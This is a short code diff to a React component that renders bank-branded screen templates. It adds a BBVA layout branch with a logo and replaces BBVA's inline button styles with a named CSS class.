@@ -58,6 +58,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {children}
           </div>
         );
+      } else if (banco === 'BBVA') {
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            {bankLogo()}
+            {children}
+          </div>
+        );
       } else {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
@@ -378,7 +385,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'BANBAJIO':
         return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
       case 'BBVA':
-        return 'bg-[#072146] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
+        return 'bbva-button';
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
